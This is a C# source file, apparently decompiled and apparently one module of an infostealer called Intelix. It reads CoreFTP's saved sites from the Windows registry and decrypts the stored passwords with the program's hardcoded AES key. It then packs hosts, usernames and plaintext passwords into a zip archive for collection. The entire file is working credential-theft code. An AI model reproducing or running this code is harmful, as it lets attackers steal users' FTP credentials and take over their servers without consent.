using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200003D RID: 61
	public class CoreFtp : ITarget
	{
		// Token: 0x060000CF RID: 207 RVA: 0x0000BEBC File Offset: 0x0000A0BC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "CoreFTP";
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\FTPWare\\COREFTP\\Sites"))
			{
				bool flag = registryKey == null;
				if (!flag)
				{
					List<string> list = new List<string>();
					foreach (string name in from n in registryKey.GetSubKeyNames()
					orderby n
					select n)
					{
						try
						{
							using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
							{
								bool flag2 = registryKey2 != null;
								if (flag2)
								{
									object value = registryKey2.GetValue("Host");
									object value2 = registryKey2.GetValue("User");
									object value3 = registryKey2.GetValue("PW");
									bool flag3 = value != null;
									if (flag3)
									{
										string text = (value as string) ?? value.ToString();
										string text2;
										if ((text2 = (value2 as string)) == null)
										{
											text2 = (((value2 != null) ? value2.ToString() : null) ?? "");
										}
										string text3 = text2;
										string hexCipher;
										if ((hexCipher = (value3 as string)) == null)
										{
											hexCipher = (((value3 != null) ? value3.ToString() : null) ?? "");
										}
										string text4 = CoreFtp.DecryptCoreFtpPassword(hexCipher);
										list.Add(string.Concat(new string[]
										{
											"Url: ",
											text,
											":21\nUsername: ",
											text3,
											"\nPassword: ",
											text4,
											"\n"
										}));
										counterApplications.Files.Add(registryKey2.Name ?? "");
									}
								}
							}
						}
						catch
						{
						}
					}
					bool flag4 = list.Count > 0;
					if (flag4)
					{
						zip.AddFile("CoreFTP\\Hosts.txt", Encoding.UTF8.GetBytes(string.Join("\n", list)));
						counter.Applications.Add(counterApplications);
					}
				}
			}
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x0000C138 File Offset: 0x0000A338
		private static string DecryptCoreFtpPassword(string hexCipher)
		{
			byte[] bytes = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk");
			byte[] iv = new byte[16];
			byte[] array = CoreFtp.HexToBytes(hexCipher);
			string @string;
			using (Aes aes = Aes.Create())
			{
				aes.KeySize = 128;
				aes.BlockSize = 128;
				aes.Key = bytes;
				aes.IV = iv;
				aes.Mode = CipherMode.ECB;
				aes.Padding = PaddingMode.Zeros;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (ICryptoTransform cryptoTransform = aes.CreateDecryptor())
					{
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write))
						{
							cryptoStream.Write(array, 0, array.Length);
							cryptoStream.FlushFinalBlock();
							@string = Encoding.UTF8.GetString(memoryStream.ToArray());
						}
					}
				}
			}
			return @string;
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x0000C250 File Offset: 0x0000A450
		private static byte[] HexToBytes(string hex)
		{
			int num = hex.Length / 2;
			byte[] array = new byte[num];
			for (int i = 0; i < num; i++)
			{
				array[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
			}
			return array;
		}
	}
}
